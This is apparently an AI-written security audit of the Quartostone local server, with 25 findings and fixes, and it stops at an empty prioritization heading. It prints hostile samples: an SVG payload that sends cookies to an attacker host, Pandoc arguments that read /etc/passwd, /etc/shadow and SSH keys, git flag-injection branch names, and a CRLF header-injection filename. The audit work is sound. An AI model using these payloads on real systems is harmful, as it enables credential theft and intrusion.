# Quartostone Security Audit Report

**Date:** 2026-03-05  
**Scope:** `f:\Projects\GitHub\quartostone\quartostone\src\` (server, CLI) + `package.json`  
**Auditor:** GitHub Copilot (Claude Sonnet 4.6)

---

## Summary Table

| ID  | File                        | Severity | Issue                                                                                        |
| --- | --------------------------- | -------- | -------------------------------------------------------------------------------------------- |
| S01 | `src/server/index.ts` · all | CRITICAL | No authentication on any API endpoint                                                        |
| S02 | `src/server/index.ts`       | HIGH     | Global error handler sends unsanitized `err.message` to client                               |
| S03 | `src/server/index.ts`       | HIGH     | WebSocket server accepts connections with no origin validation                               |
| S04 | `src/server/api/git.ts`     | HIGH     | Branch name regex `[\w\-./]+` allows leading `-` (flag injection)                            |
| S05 | `src/server/api/pandoc.ts`  | HIGH     | `SAFE_PANDOC_OPTION` regex allows `/` in values; many dangerous flags not in `BLOCKED_FLAGS` |
| S06 | `src/server/api/assets.ts`  | HIGH     | SVG uploads allowed and served as `image/svg+xml` — enables stored XSS                       |
| S07 | `src/server/index.ts`       | MEDIUM   | CORS check is trivially bypassed by omitting `Origin` header                                 |
| S08 | `src/server/index.ts`       | MEDIUM   | No `helmet` — missing `X-Content-Type-Options`, CSP, `X-Frame-Options`, etc.                 |
| S09 | `src/server/api/render.ts`  | MEDIUM   | Raw quarto `stderr` (may contain absolute paths) returned in error response                  |
| S10 | `src/server/api/export.ts`  | MEDIUM   | Raw quarto `stderr` stored in `job.error` and served to client                               |
| S11 | `src/server/api/export.ts`  | MEDIUM   | `Content-Disposition` header built from unescaped filename — header injection risk           |
| S12 | `src/server/api/pandoc.ts`  | MEDIUM   | `runPandoc` has no output buffer size limit (OOM potential)                                  |
| S13 | `src/server/watcher.ts`     | MEDIUM   | Raw `stderr` and `String(err)` broadcast to all WebSocket clients                            |
| S14 | `src/server/api/preview.ts` | MEDIUM   | Preview `logs` endpoint returns quarto output without sanitization                           |
| S15 | `src/server/api/preview.ts` | MEDIUM   | No limit on preview process count — trivial DoS by spawning unlimited processes              |
| S16 | `src/server/api/preview.ts` | MEDIUM   | Preview map key is raw user-supplied path — path normalisation inconsistency                 |
| S17 | Multiple API files          | MEDIUM   | No rate limiting on any computationally expensive endpoint                                   |
| S18 | `src/server/api/exec.ts`    | MEDIUM   | No concurrent execution limit — multiple simultaneous subprocesses                           |
| S19 | `src/server/api/pages.ts`   | MEDIUM   | `buildTree` follows directory symlinks without checking they resolve within `pagesDir`       |
| S20 | `src/server/api/git.ts`     | MEDIUM   | `git show` path argument concatenated directly: `${sha}:${path}`                             |
| S21 | `src/cli/commands/serve.ts` | LOW      | `exec` shell command to open browser — port is validated but shell is used                   |
| S22 | `src/server/api/git.ts`     | LOW      | Duplicate `'http:'` in allowed remote URL protocols list                                     |
| S23 | `src/server/api/export.ts`  | LOW      | Export download token not validated as UUID format before map lookup                         |
| S24 | `src/server/api/exec.ts`    | LOW      | User-controlled `language` string reflected in error message                                 |
| S25 | `package.json`              | LOW      | No `helmet` dependency; no express rate-limiter dependency                                   |

---

## Detailed Findings

---

### S01 — CRITICAL: No authentication on any API endpoint

**File:** `src/server/index.ts` (all registered routes)  
**Lines:** ~50–110 (route registration block)

**Description:**  
Every API route — including file read/write, git operations, code execution, and export — is completely unauthenticated. Any HTTP client that can reach the server can perform any operation. The server binds to `127.0.0.1` by default (see `serve.ts:29`), which limits exposure to the local machine, but that is the only protection. Threats include:

- Other processes on the same machine (malware, CI runners, Docker containers with host networking).
- If the server is ever accidentally bound to `0.0.0.0` (e.g., misconfigured reverse proxy or future change), every operation is exposed to the network.
- Browser-based attacks: any page open in the browser can send credentialed requests to `localhost:4242` without needing to bypass CORS (see S07).
- When `allow_code_execution: true`, the `/api/exec` endpoint becomes a fully unauthenticated remote code execution endpoint.

**Recommended fix:**  
Add a secret token (stored in `_quartostone.yml` or generated at startup and printed to the terminal). Every API request must include it as a header or cookie. At minimum, generate a random token on server start and require it as `Authorization: Bearer <token>`.

```typescript
// On startup, generate and print token
const token = randomBytes(32).toString('hex');
console.log(`\n  API token: ${token}  (required for all API requests)\n`);

// Middleware
app.use('/api', (req, res, next) => {
  const auth = req.headers['authorization'];
  if (auth !== `Bearer ${token}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
});
```

---

### S02 — HIGH: Global error handler sends unsanitized `err.message` to client

**File:** `src/server/index.ts`  
**Lines:** ~112–117

**Description:**

```typescript
app.use((err: unknown, _req: Request, res: Response, _next: NextFunction) => {
  const message = err instanceof Error ? err.message : String(err);
  if (!res.headersSent) {
    res.status(500).json({ error: message });
  }
});
```

This catch-all handler receives errors propagated via `next(err)` from asynchronous route wrappers (`asyncRoute` utility). Unlike the individual API handlers which use `sanitizeError()`, this handler forwards the raw `Error.message` directly to the HTTP client. A Node.js `ENOENT` error exposes absolute filesystem paths:

```
ENOENT: no such file or directory, open '/home/user/project/pages/secret.qmd'
```

This reveals the server's filesystem layout, absolute paths, and potentially username/home directory.

**Recommended fix:**  
Apply the same `sanitizeError` function used in individual handlers:

```typescript
import { sanitizeError } from './utils/errorSanitizer.js';

app.use((err: unknown, _req: Request, res: Response, _next: NextFunction) => {
  const message = sanitizeError(err);
  if (!res.headersSent) {
    res.status(500).json({ error: message });
  }
});
```

---

### S03 — HIGH: WebSocket server accepts connections with no origin validation

**File:** `src/server/index.ts`  
**Lines:** ~122–125

**Description:**

```typescript
const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
```

The `ws` library's `WebSocketServer` does not check the `Origin` header on upgrade requests by default. The Express CORS middleware only handles HTTP requests; it does not intercept WebSocket upgrade requests. Therefore:

1. Any webpage loaded in the user's browser (including malicious third-party sites) can open a WebSocket connection to `ws://localhost:4242/ws`.
2. Once connected, the attacker receives all broadcast events: `render:error` (which can contain stderr with paths — see S13), `git:committed`, `git:prompt`, `git:error`, `file:changed`.
3. Data exfiltration: watching commit messages, file paths, render errors etc.

**Recommended fix:**  
Add an `handleProtocols` or `verifyClient` callback that validates the `origin` header:

```typescript
const wss = new WebSocketServer({
  server: httpServer,
  path: '/ws',
  verifyClient: ({ origin }: { origin: string }) => {
    const allowed = `http://localhost:${ctx.config.port}`;
    return !origin || origin === allowed;
  },
});
```

---

### S04 — HIGH: Branch name regex allows leading `-` (git argument injection)

**File:** `src/server/api/git.ts`  
**Lines:** ~213–217, ~235–237, ~265–267

**Description:**  
Branch names are validated with:

```typescript
if (!name || !/^[\w\-./]+$/.test(name)) {
  return badRequest(res, 'valid branch name required');
}
```

The regex `^[\w\-./]+$` allows names starting with `-`. Although `simple-git` uses `spawn` (no shell), git itself interprets leading-dash token as flags. Examples:

| User-supplied name              | Resulting git command                 | Effect                                                        |
| ------------------------------- | ------------------------------------- | ------------------------------------------------------------- |
| `--force` (in checkout)         | `git checkout --force`                | Forces checkout, discards uncommitted changes                 |
| `--abort` (in merge)            | `git merge --abort --no-ff -m "..."`  | Aborts an in-progress merge resolution, wiping conflict state |
| `--squash` (in merge)           | `git merge --squash --no-ff -m "..."` | Conflicting flags; may cause unexpected behavior              |
| `--delete` (in branch creation) | `git checkout -b --delete`            | Passes `--delete` as a git flag rather than a branch name     |

In the auto-stash path of `/api/git/checkout`, the branch name is also interpolated into the stash message string:

```typescript
await git.stash(['push', '-m', `qs-autostash before switching to ${branch}`]);
```

This is safe (spawn, not shell) but the stash message stored in git permanently contains the attacker's string.

**Recommended fix:**

```typescript
// Reject names starting with '-' and enforce stricter git refname rules
const BRANCH_RE = /^[a-zA-Z0-9][a-zA-Z0-9\-._/]*$/;
if (!name || !BRANCH_RE.test(name) || name.includes('..')) {
  return badRequest(res, 'valid branch name required');
}
```

---

### S05 — HIGH: Pandoc option sanitiser allows dangerous flags and file-path values

**File:** `src/server/api/pandoc.ts`  
**Lines:** ~85–96

**Description:**  
The `sanitisePandocOptions` function uses two guards: a regex `SAFE_PANDOC_OPTION` and a `BLOCKED_FLAGS` list.

```typescript
const SAFE_PANDOC_OPTION = /^--[a-zA-Z][\w-]*(?:=[a-zA-Z0-9\-_.@/=:,+]+)?$/u;
const BLOCKED_FLAGS = [
  '--output',
  '--lua-filter',
  '--extract-media',
  '--resource-path',
  '--data-dir',
  '--filter',
  '--template',
];
```

**Problem 1 — `/` is allowed in option values:** The `=` capture group allows `/` characters. This means file path values are not filtered out. An attacker can pass:

```
--bibliography=/etc/passwd
--csl=/home/user/.ssh/id_rsa
--pdf-engine=/usr/bin/bash
--reference-doc=/path/to/sensitive.docx
--highlight-style=/path/to/file
--epub-cover-image=/etc/shadow
```

**Problem 2 — Dangerous flags not in `BLOCKED_FLAGS`:**

| Flag                        | Impact                                                                                                                                                         |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--bibliography=<file>`     | Pandoc reads arbitrary file as bibliography data. Fails silently on non-BibTeX files, but valid CSL-JSON outside the project is readable.                      |
| `--pdf-engine=<binary>`     | Causes pandoc to **execute** the specified binary as the PDF rendering engine. Full arbitrary code execution bypass of the `allow_code_execution` config flag. |
| `--csl=<file>`              | Reads arbitrary CSL file; on malformed data, pandoc may print file contents in error messages.                                                                 |
| `--reference-doc=<file>`    | Reads arbitrary DOCX/ODT file as a style template.                                                                                                             |
| `--epub-cover-image=<file>` | Reads arbitrary image from disk.                                                                                                                               |

Note: the export API's `SAFE_ARG` regex does **not** allow `/` in values (`/^--[\w-]+(=[\w.,:-]+)?$/`), so the export endpoint is correctly protected. The pandoc endpoint is not.

**Recommended fix:**  
Add the dangerous flags to `BLOCKED_FLAGS` and tighten the regex to disallow `/` in values:

```typescript
const BLOCKED_FLAGS = [
  '--output',
  '--lua-filter',
  '--extract-media',
  '--resource-path',
  '--data-dir',
  '--filter',
  '--template',
  // additionally block file-reading and execution flags:
  '--bibliography',
  '--csl',
  '--pdf-engine',
  '--reference-doc',
  '--epub-cover-image',
  '--highlight-style',
  '--include-in-header',
  '--include-before-body',
  '--include-after-body',
  '--syntax-definition',
];

// Match export.ts: disallow '/' and '@' in option values
const SAFE_PANDOC_OPTION = /^--[a-zA-Z][\w-]*(?:=[\w.,:-]+)?$/;
```

---

### S06 — HIGH: SVG uploads enabled and served with `image/svg+xml` — stored XSS

**File:** `src/server/api/assets.ts`  
**Lines:** ~17, ~41–49, ~65–68

**Description:**  
SVG is in the allowed extension and MIME type sets:

```typescript
const ALLOWED_EXTS = new Set(['.png', '.jpg', ..., '.svg', ...]);
const ALLOWED_MIMETYPES = new Set(['image/jpeg', ..., 'image/svg+xml', ...]);
```

SVG files are XML documents that can contain `<script>` tags and `onload`/`onerror` event handlers. When served with `Content-Type: image/svg+xml` and loaded by a browser in an `<img>` tag or directly by URL, they execute JavaScript in the page's origin context.

The assets are served via:

```typescript
app.get('/assets/:filename', (req, res) => {
  res.sendFile(filePath);
});
```

`express.sendFile` sets `Content-Type` based on the file extension. `.svg` maps to `image/svg+xml`, so browsers will execute embedded scripts.

**Attack scenario:** Upload an SVG containing `<svg xmlns="..." onload="fetch('http://attacker/?c='+document.cookie)">`. When any page embeds this image, the script runs in the application origin.

**Recommended fix:**  
Either block SVG uploads entirely, or serve SVG files with a forced content-disposition and sandboxed MIME type:

```typescript
app.get('/assets/:filename', (req, res) => {
  const filename = basename(String(req.params['filename'] ?? ''));
  const filePath = join(assetsDir, filename);
  if (!existsSync(filePath)) return notFound(res, 'Not found');
  // Force download for SVG to prevent inline script execution
  if (filename.toLowerCase().endsWith('.svg')) {
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', 'text/plain');
  }
  res.sendFile(filePath);
});
```

---

### S07 — MEDIUM: CORS check is bypassable — requests without `Origin` header pass through

**File:** `src/server/index.ts`  
**Lines:** ~51–59

**Description:**

```typescript
const origin = req.headers.origin;
if (origin && origin !== allowedOrigin) {
  // ← only checks if Origin present
  res.status(403).json({ error: 'Cross-origin request denied' });
  return;
}
```

The `if (origin && ...)` guard only blocks requests that **have** an `Origin` header that doesn't match. Requests without an `Origin` header — which includes all `curl`, Python `requests`, Postman, native app HTTP clients, server-side scripts, and any non-browser client — bypass this check entirely and get full access to all APIs.

This is not a browser security bypass (browsers always send `Origin` for cross-origin requests), but it means the CORS guard provides no protection against non-browser local attackers: malware, other user processes, CI scripts with access to the machine.

**Recommended fix:**  
This is structural — the CORS check is not a substitute for authentication (S01). If authentication is not added, consider at minimum documenting that non-browser clients have unrestricted access. If authentication is added, the CORS check becomes a secondary layer rather than the first line of defense.

---

### S08 — MEDIUM: No `helmet` middleware — missing security headers

**File:** `src/server/index.ts` (no `helmet` anywhere in codebase)  
**Lines:** ~45 (request setup)

**Description:**  
The server has no `helmet` or equivalent security header middleware. Missing headers:

| Header                            | Risk without it                                                                  |
| --------------------------------- | -------------------------------------------------------------------------------- |
| `X-Content-Type-Options: nosniff` | Enables MIME sniffing; combined with SVG (S06), allows type confusion attacks    |
| `X-Frame-Options: DENY`           | The editor UI can be embedded in an `<iframe>` — clickjacking                    |
| `Content-Security-Policy`         | No script source restriction; XSS payloads (e.g., from SVG) have free rein       |
| `Referrer-Policy: no-referrer`    | File paths in the URL may leak via the `Referer` header to third-party resources |
| `Permissions-Policy`              | No restriction on camera/microphone/geolocation access from embedded pages       |

**Recommended fix:**  
Add `helmet` as a dependency and apply it early:

```typescript
import helmet from 'helmet';
app.use(helmet({ contentSecurityPolicy: false })); // tune CSP per app needs
```

---

### S09 — MEDIUM: Raw quarto `stderr` returned in render error response

**File:** `src/server/api/render.ts`  
**Lines:** ~62–65

**Description:**

```typescript
res.status(500).json({ ok: false, error: stderr || `quarto render exited with code ${code}` });
```

Quarto's stderr output commonly includes absolute filesystem paths, extension versions, and internal error details, for example:

```
ERROR: 'C:\Users\david\project\pages\file.qmd' -- system error -- No such file
ERROR: path '/home/user/.local/share/quarto/extensions/...' ...
```

These are sent verbatim to the HTTP client, exposing the server's filesystem layout and username.

**Recommended fix:**  
Apply the same `sanitizeError` logic from `errorSanitizer.ts` to the stderr string before sending it:

```typescript
import { sanitizeError } from '../utils/errorSanitizer.js';
// ...
res
  .status(500)
  .json({ ok: false, error: sanitizeError(new Error(stderr)) || `quarto render exited` });
```

Alternatively, create a dedicated `sanitizeStderr(s: string): string` helper that strips paths.

---

### S10 — MEDIUM: Raw quarto `stderr` stored in `job.error` and returned to client

**File:** `src/server/api/export.ts`  
**Lines:** ~126–130, ~140–143, ~225–228

**Description:**  
In `runExport`, multiple code paths set `job.error` to the raw stderr:

```typescript
job.error = stderr.trim() || `quarto render exited with code ${String(code)}`;
// and:
job.error = 'LaTeX is not installed...';
// etc.
```

The `job.error` field is then served via `GET /api/export/status`:

```typescript
res.json({ token: job.token, status: job.status, filename: job.filename, error: job.error });
```

Like S09, quarto stderr contains absolute paths.

**Recommended fix:**  
Apply `sanitizeError`/path-stripping to `stderr` before storing in `job.error`.

---

### S11 — MEDIUM: `Content-Disposition` header injection via unsanitized filename

**File:** `src/server/api/export.ts`  
**Lines:** ~244

**Description:**

```typescript
res.setHeader('Content-Disposition', `attachment; filename="${job.filename}"`);
```

`job.filename = stem + ext` where `stem = basename(filePath, extname(filePath))`. The `filePath` is validated to be within `pagesDir`, but the filename component can still contain characters that are invalid in HTTP header values, including `"` (quote) and `\r\n` (CRLF).

A file named `evil"name.qmd` would produce the malformed header:

```
Content-Disposition: attachment; filename="evil"name.pdf"
```

A file named `foo\r\nX-Injected: header.qmd` (if the filesystem permits it) would inject an additional HTTP header.

**Recommended fix:**  
Use RFC 5987 encoding or at minimum strip/encode problematic characters:

```typescript
const safeName = job.filename.replace(/["\\]/g, '_');
res.setHeader(
  'Content-Disposition',
  `attachment; filename="${safeName}"; filename*=UTF-8''${encodeURIComponent(job.filename)}`
);
```

---

### S12 — MEDIUM: `runPandoc` has no output buffer size limit

**File:** `src/server/api/pandoc.ts`  
**Lines:** ~47–50

**Description:**

```typescript
proc.stdout.on('data', (chunk: Buffer) => {
  stdout += chunk.toString();
});
proc.stderr.on('data', (chunk: Buffer) => {
  stderr += chunk.toString();
});
```

Unlike the exec API which caps stdout/stderr at `MAX_OUTPUT = 1_048_576` (1 MB), `runPandoc` accumulates without limit. A specially crafted markdown document (within the ~1 MB JSON body limit) can produce a disproportionately large pandoc AST output. For example, a markdown table with 10,000 rows expands significantly in JSON AST format. This could exhaust server heap memory.

**Recommended fix:**  
Apply the same pattern used in `exec.ts`:

```typescript
const MAX_PANDOC_OUTPUT = 10 * 1_048_576; // 10 MB
proc.stdout.on('data', (chunk: Buffer) => {
  if (stdout.length < MAX_PANDOC_OUTPUT) stdout += chunk.toString();
});
```

---

### S13 — MEDIUM: `watcher.ts` broadcasts raw `stderr` and error strings via WebSocket

**File:** `src/server/watcher.ts`  
**Lines:** ~50–52, ~72, ~87–90

**Description:**

```typescript
ctx.broadcast('render:error', { path: relPath, error: stderr });
// ...
ctx.broadcast('render:error', { path: filePath, error: String(err) });
// ...
ctx.broadcast('git:error', { error: String(e) });
```

Three broadcast paths send unsanitized content to WebSocket clients:

1. `render:error.error` — raw quarto `stderr` containing absolute paths.
2. `render:error.error` from `proc.on('error')` — Node.js spawn error message (can contain paths).
3. `git:error.error` — raw git error string (can contain git credentials or paths before `sanitizeGitError` is applied; here it's `String(e)` directly).

Since S03 shows the WebSocket has no origin validation, any browser tab can receive these leaks.

**Recommended fix:**  
Apply sanitizers before broadcasting:

```typescript
import { sanitizeGitError, sanitizeError } from './utils/errorSanitizer.js';
// ...
ctx.broadcast('render:error', { path: relPath, error: sanitizeError(new Error(stderr)) });
ctx.broadcast('git:error', { error: sanitizeGitError(e) });
```

---

### S14 — MEDIUM: Preview `logs` endpoint returns raw quarto output without sanitization

**File:** `src/server/api/preview.ts`  
**Lines:** ~285–291

**Description:**

```typescript
app.get('/api/preview/logs', (req, res) => {
  const filePath = req.query['path'] as string | undefined;
  if (!filePath) return badRequest(res, 'path is required');
  const entry = previews.get(filePath);
  if (!entry) return res.json({ logs: [] });
  res.json({ logs: entry.logs });
});
```

The `entry.logs` array is built from raw quarto stdout/stderr in `startPreview`:

```typescript
const captureLog = (data: Buffer) => {
  const line = data.toString().trimEnd();
  logs.push(line);
```

These logs are served verbatim, potentially containing absolute paths from quarto's output.

Additionally, `filePath` is not validated to be a real file path; any string can be used to probe the previews map (though unsuccessful probes return `{ logs: [] }`, so it's a minor info-only issue).

**Recommended fix:**  
Strip absolute paths from log lines before serving:

```typescript
res.json({ logs: entry.logs.map((line) => sanitizeError(new Error(line))) });
```

---

### S15 — MEDIUM: No cap on concurrent preview processes

**File:** `src/server/api/preview.ts`  
**Lines:** ~198–208

**Description:**

```typescript
const port = await findFreePort();
const entry = startPreview(cwd, absPath, filePath, port, format, quartoExecutable);
```

A new `quarto preview` subprocess is spawned for each unique `(filePath, format)` combination, with no limit on how many can exist simultaneously. An unauthenticated attacker can issue hundreds of requests with different `path` values, spawning hundreds of `quarto preview` processes and exhausting CPU, memory, and file descriptors.

The existing deduplication only works if the same `path` string is reused. Using slightly different path representations (e.g., `pages/a.qmd` vs `./pages/a.qmd`) creates separate entries.

**Recommended fix:**

1. Normalize the path to a canonical form before using it as the map key:
   ```typescript
   const relPath = resolve(join(cwd, filePath))
     .slice(cwd.length + 1)
     .replace(/\\/g, '/');
   ```
2. Cap the total number of concurrent previews:
   ```typescript
   const MAX_PREVIEWS = 5;
   if (previews.size >= MAX_PREVIEWS) {
     return res.status(429).json({ error: 'Too many active previews' });
   }
   ```

---

### S16 — MEDIUM: Preview map keyed by raw unvalidated user-supplied path

**File:** `src/server/api/preview.ts`  
**Lines:** ~200–203, ~222, ~242

**Description:**  
The preview process map uses the raw user-supplied `filePath` string as the key:

```typescript
const existing = previews.get(filePath); // raw user input
// ...
previews.set(relPath, entry); // relPath == filePath in startPreview
```

Meanwhile, `/api/preview/stop?path=` and `/api/preview/status?path=` look up by the user-provided path. If `startPreview` was called with `pages/note.qmd` but `stop` is called with `./pages/note.qmd`, the entry is not found and the process is not killed.

More concerning: the stop endpoint does no path validation:

```typescript
app.post('/api/preview/stop', (req, res) => {
  const { path: filePath } = req.body as { path?: string };
  // No isInsideDir check here
  const entry = previews.get(filePath);
```

Any string is accepted as a preview key. An attacker who knows a valid preview key can stop another user's preview session.

**Recommended fix:**  
Normalize paths before use as map keys, and validate that provided paths fall within `pagesDir`.

---

### S17 — MEDIUM: No rate limiting on any endpoint

**File:** All API route files  
**Lines:** N/A

**Description:**  
None of the API endpoints have rate limiting. The following endpoints are computationally expensive and can be abused to degrade or crash the server:

| Endpoint                         | Cost                                                                                              |
| -------------------------------- | ------------------------------------------------------------------------------------------------- |
| `POST /api/render`               | Spawns `quarto render`, compiles Quarto documents — CPU and I/O intensive, up to 120s per request |
| `POST /api/export`               | Same as render, plus temp file creation                                                           |
| `POST /api/exec`                 | Spawns Python/R/Julia interpreter                                                                 |
| `POST /api/pandoc/markdownToAst` | Spawns `pandoc`, potentially with large input                                                     |
| `POST /api/pandoc/astToMarkdown` | Same                                                                                              |
| `POST /api/pandoc/capabilities`  | Spawns up to 4 pandoc processes (results are cached after first call)                             |
| `POST /api/git/push` / `pull`    | Network operations, hold connection open for 30s                                                  |
| `POST /api/search/reindex`       | Reads all `.qmd` files from disk                                                                  |
| `GET /api/search?q=`             | Runs an in-memory search across the full index                                                    |

**Recommended fix:**  
Add a request rate limiter per IP or globally. Using `express-rate-limit`:

```typescript
import rateLimit from 'express-rate-limit';
const expensiveLimiter = rateLimit({ windowMs: 60_000, max: 10 });
app.use(['/api/render', '/api/export', '/api/exec', '/api/pandoc'], expensiveLimiter);
```

Since this is a local single-user tool, even a simple global in-process counter would help prevent accidental or malicious DoS.

---

### S18 — MEDIUM: No cap on concurrent subprocess execution

**File:** `src/server/api/exec.ts`, `src/server/api/render.ts`, `src/server/api/export.ts`, `src/server/api/pandoc.ts`  
**Lines:** exec.ts ~95, render.ts ~42, export.ts ~97, pandoc.ts ~42

**Description:**  
All four route modules spawn external subprocesses on every request without tracking how many are currently running. Multiple concurrent requests to `/api/exec` (if enabled) would spawn multiple Python/R/Julia processes simultaneously with no bound. Similarly for render, export, and pandoc.

A slow request holds the subprocess open for the full timeout duration (30–120s). Rapid sequential requests stack up, potentially consuming all system resources.

**Recommended fix:**  
Maintain a concurrency counter and reject requests over a limit:

```typescript
let activeRenders = 0;
const MAX_CONCURRENT_RENDERS = 3;

app.post('/api/render', (req, res) => {
  if (activeRenders >= MAX_CONCURRENT_RENDERS) {
    return res.status(429).json({ error: 'Too many concurrent render requests' });
  }
  activeRenders++;
  // ... existing handler ...
  child.on('close', () => {
    activeRenders--; /* ... */
  });
});
```

---

### S19 — MEDIUM: `buildTree` follows symlinks without checking they resolve within `pagesDir`

**File:** `src/server/api/pages.ts`  
**Lines:** ~21–39

**Description:**

```typescript
function buildTree(dir: string, rootDir: string, depth = 0): PageNode[] {
  if (depth > 20) return [];
  const entries = readdirSync(dir, { withFileTypes: true });
  for (const entry of entries) {
    if (entry.isDirectory()) {
      nodes.push({ ..., children: buildTree(full, rootDir, depth + 1) });
    } else if (entry.isFile() && extname(entry.name) === '.qmd') {
```

`readdirSync` with `withFileTypes: true` uses `Dirent.isDirectory()`. On Node 20+, `isDirectory()` does NOT follow symlinks for the dirent itself; however, `readdir` without `recursive` will include symlinks to directories as separate dirents. `isDirectory()` called on a symlink dirent returns `false`, so they would be included as files.

However, if `readdirSync` is called with `{ withFileTypes: true }` and `isDirectory()` follows the symlink target (behavior depends on Node version and OS), a symlink like `pages/link -> /etc` would be traversed and its contents enumerated. The depth limit of 20 prevents unbounded recursion but allows up to 20 levels of traversal outside `pagesDir`.

Even when symlinks are not traversed as directories, `readFileSync` on a `.qmd`-named symlink pointing outside `pagesDir` would read and return the content of the target file.

**Recommended fix:**  
Use `readdirSync(dir, { withFileTypes: true })` and call `entry.isSymbolicLink()` to skip symlinks:

```typescript
if (entry.isDirectory() && !entry.isSymbolicLink()) { ... }
if (entry.isFile() && !entry.isSymbolicLink() && extname(entry.name) === '.qmd') { ... }
```

---

### S20 — MEDIUM: `git show` path argument concatenated without separating the pathspec

**File:** `src/server/api/git.ts`  
**Lines:** ~317–319

**Description:**

```typescript
const content = await git.show([`${sha}:${path}`]);
```

The `sha` is properly validated with `SAFE_SHA = /^[0-9a-f]{4,64}$/i`. However, `path` comes from `req.query['path']`, is only checked with `isInsideDir`, and is concatenated directly into the `sha:path` pathspec.

Git interprets everything up to the first `:` as the revision, and everything after as the path. If `path` contains special characters that are meaningful to git pathspecs (e.g., `:(glob)`, `:(exclude)`), git may interpret them specially. More critically, if `path` contains a `:` character (e.g., `foo:bar`), the full argument becomes `abc123:foo:bar`, which git resolves as SHA `abc123`, blob `foo` within that tree, then `:bar` as further navigation — this may reveal files not intended to be visible.

**Recommended fix:**  
Use the long-form `git show` with explicit pathspec disambiguation, or validate that `path` contains no `:` character:

```typescript
if (path.includes(':') || path.includes('\n')) {
  return badRequest(res, 'Invalid path characters');
}
```

---

### S21 — LOW: `exec` with shell interpolation used for opening browser

**File:** `src/cli/commands/serve.ts`  
**Lines:** ~29–38

**Description:**

```typescript
const cmd =
  process.platform === 'win32'
    ? `start http://localhost:${port}`
    : process.platform === 'darwin'
      ? `open http://localhost:${port}`
      : `xdg-open http://localhost:${port}`;
exec(cmd);
```

`exec` is used (which invokes the shell) rather than `execFile`/`spawn`. The `port` value is validated to be an integer 1–65535 by Commander's `parseInt` argument parser, so there is no injection risk from `port` itself. However:

1. The use of `exec` rather than `execFile` is an unnecessary security footgun. If the port validation were ever bypassed or the code were refactored carelessly, it would become a shell injection vector.
2. `exec` has no error handling — if `xdg-open` is not installed, the error is silently swallowed.

**Recommended fix:**  
Use `execFile` or `spawn` to avoid the shell:

```typescript
import { execFile } from 'node:child_process';
const [cmd, ...args] =
  process.platform === 'win32'
    ? ['cmd', '/c', 'start', `http://localhost:${port}`]
    : process.platform === 'darwin'
      ? ['open', `http://localhost:${port}`]
      : ['xdg-open', `http://localhost:${port}`];
execFile(cmd, args, { stdio: 'ignore' }, () => {}); // ignore errors
```

---

### S22 — LOW: Duplicate `'http:'` in allowed remote URL protocol list

**File:** `src/server/api/git.ts`  
**Lines:** ~168–169

**Description:**

```typescript
const allowedProtocols = ['https:', 'http:', 'http:', 'ssh:', 'git:'];
```

`'http:'` appears twice. This is a minor bug and a copy-paste error. More substantively: permitting `http:` (unencrypted) allows a user to set a remote that results in credentials being sent in cleartext. This is a protocol-level issue, not exploitable by the quartostone server itself, but worth flagging.

**Recommended fix:**  
De-duplicate the list and consider whether `http:` should be permitted:

```typescript
const allowedProtocols = ['https:', 'ssh:', 'git:'];
```

---

### S23 — LOW: Export download token not validated as UUID before map lookup

**File:** `src/server/api/export.ts`  
**Lines:** ~222–226

**Description:**

```typescript
const token = req.query['token'] as string | undefined;
if (!token) return badRequest(res, 'token is required');
const job = jobs.get(token);
if (!job) return notFound(res, 'Job not found');
```

Any string (including very long strings or strings containing special characters) is accepted and used as a Map key. This allows probing the jobs map with arbitrary keys. While the information disclosed is minimal ("Job not found"), validating the token format as a UUID prevents unnecessary string comparisons and discloses no information for non-UUID inputs.

**Recommended fix:**

```typescript
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
if (!token || !UUID_RE.test(token)) return badRequest(res, 'Invalid token format');
```

---

### S24 — LOW: User-controlled `language` string reflected directly in error response

**File:** `src/server/api/exec.ts`  
**Lines:** ~105–107

**Description:**

```typescript
default:
  badRequest(res, `Unsupported language: ${String(language)}`);
```

The user-supplied `language` value is reflected verbatim in the HTTP error response. In a JSON context this is not directly exploitable as XSS, but if the client ever renders this string as HTML without escaping (e.g., using `innerHTML`), it becomes a stored/reflected XSS vector.

**Recommended fix:**  
Use a static error message instead of reflecting user input:

```typescript
badRequest(res, 'Unsupported language. Allowed values: python, r, julia');
```

---

### S25 — LOW: Missing security-focused dependencies in `package.json`

**File:** `package.json`

**Description:**  
The following packages are absent from both `dependencies` and `devDependencies`:

| Package              | Purpose                                 |
| -------------------- | --------------------------------------- |
| `helmet`             | Sets secure HTTP response headers (S08) |
| `express-rate-limit` | Rate limiting middleware (S17)          |

The project also has no lockfile integrity check configured. `npm ci` would enforce `package-lock.json`, but the audit tooling (`npm audit`) is not invoked in any CI/CD context visible in the scripts.

**Recommended fix:**  
Add `helmet` and `express-rate-limit` to `dependencies`. Run `npm audit` as part of the CI pipeline. Consider adding `socket:` as a supply-chain security registry.

---

## Cross-Cutting Observations

### Positive security practices already in place

The following were reviewed and found to be well-implemented:

- **Path guard utilities** (`pathGuard.ts`): Both `resolveInsideDir` and `isInsideDir` correctly handle `../` traversal, absolute path injection, and Windows drive-letter paths. Used consistently across pages, trash, render, and export APIs.
- **SHA validation** (`SAFE_SHA` regex): Git SHA parameters are validated to `[0-9a-f]{4,64}` before use.
- **`simple-git` via `spawn`** (not shell): All git operations avoid shell injection risk.
- **exec API disabled by default**: `allow_code_execution: false` is the safe default.
- **Commit message length limit**: 4096-character cap on commit messages.
- **Branch name validation**: Partial validation exists (just missing the leading `-` check).
- **Multer file type filtering**: Both extension and MIME type are validated for uploads (SVG concern noted in S06).
- **YAML parsing**: Uses `yaml` v2 which does not execute arbitrary code.
- **`sanitizeError` / `sanitizeGitError`**: Applied in most individual handlers; credential and path stripping is well-implemented. The gap is the global catch-all handler (S02) and broadcast paths (S13).
- **GIT_NETWORK_TIMEOUT_MS**: Network git operations timeout after 30s, preventing hung requests.
- **Export job cleanup timer**: Time-based cleanup of temp directories prevents disk exhaustion.
- **UUID-based trash IDs with validation**: `UUID_RE` validated before trash restore/delete operations.

### Risk prioritization

Given the localhost-only binding (`127.0.0.1`) and the local development tool nature:

